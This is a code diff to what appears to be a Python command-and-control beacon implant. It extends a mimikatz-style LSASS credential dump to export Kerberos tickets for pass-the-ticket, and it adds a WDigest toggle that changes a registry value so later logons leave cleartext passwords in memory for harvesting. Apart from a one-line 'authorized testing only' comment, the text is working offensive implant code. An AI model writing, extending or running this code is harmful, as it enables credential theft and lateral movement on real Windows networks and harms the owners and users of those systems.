@@ -107,7 +107,10 @@ class Beacon:
         name, args, err = cmd.validate_cmd(cmdline)
         if err:
             return False, f"task error: {err}"
-        handler = getattr(self, f"do_{name}", None)
+        # Hyphenated command names (lsass-parse, socks-stop, wdigest-enable)
+        # map to underscore handler methods (do_lsass_parse, ...). Without
+        # this the getattr lookup fails with "no handler".
+        handler = getattr(self, f"do_{name.replace('-', '_')}", None)
         if not handler:
             return False, f"no handler for {name}"
         try:
@@ -352,6 +355,8 @@ class Beacon:
           sekurlsa --pkgs msv,wdigest       # subset
           sekurlsa --pid 1234               # explicit PID
           sekurlsa --no-lsa                 # skip LSA step (faster, no cleartext)
+          sekurlsa --export-dir C:\\tickets    # write .kirbi files (pass-the-ticket)
+          sekurlsa --export-ccache C:\\t.ccache  # write one MIT ccache
 
         Returns a long text report (mimikatz sekurlsa::logonpasswords style).
         """
@@ -359,6 +364,8 @@ class Beacon:
         pkgs = "all"
         pid = None
         no_lsa = False
+        export_dir = None
+        export_ccache = None
         i = 0
         while i < len(parts):
             t = parts[i]
@@ -371,9 +378,16 @@ class Beacon:
             elif t == "--no-lsa":
                 no_lsa = True
                 i += 1
+            elif t == "--export-dir" and i + 1 < len(parts):
+                export_dir = parts[i + 1]
+                i += 2
+            elif t == "--export-ccache" and i + 1 < len(parts):
+                export_ccache = parts[i + 1]
+                i += 2
             elif t in ("--help", "-h"):
                 return True, ("usage: sekurlsa [--pkgs msv,wdigest,...] "
-                              "[--pid <pid>] [--no-lsa]")
+                              "[--pid <pid>] [--no-lsa] "
+                              "[--export-dir <dir>] [--export-ccache <file>]")
             else:
                 # positional: treat as packages list (legacy form)
                 pkgs = t
@@ -381,7 +395,27 @@ class Beacon:
         mod = self._load_import("lsass")
         if mod is None:
             return False, "lsass module unavailable"
-        return mod.sekurlsa_logonpasswords(packages=pkgs, pid=pid, no_lsa=no_lsa)
+        return mod.sekurlsa_logonpasswords(packages=pkgs, pid=pid, no_lsa=no_lsa,
+                                           export_dir=export_dir,
+                                           export_ccache=export_ccache)
+
+    # --- WDigest cleartext toggle (Windows; admin required) ---
+    # AUTHORIZED SECURITY TESTING ONLY. Sets the UseLogonCredential registry
+    # value so future logons leave cleartext passwords in LSASS for sekurlsa
+    # to harvest. See cs/modules/lsass.py.
+    def do_wdigest_enable(self, args):
+        parts = args.split()
+        disable = "--disable" in parts or "--off" in parts
+        mod = self._load_import("lsass")
+        if mod is None:
+            return False, "lsass module unavailable"
+        return mod.enable_wdigest(disable=disable)
+
+    def do_wdigest_status(self, args):
+        mod = self._load_import("lsass")
+        if mod is None:
+            return False, "lsass module unavailable"
+        return mod.wdigest_status()
 
     # ---------- Main loop ----------
     def start(self):
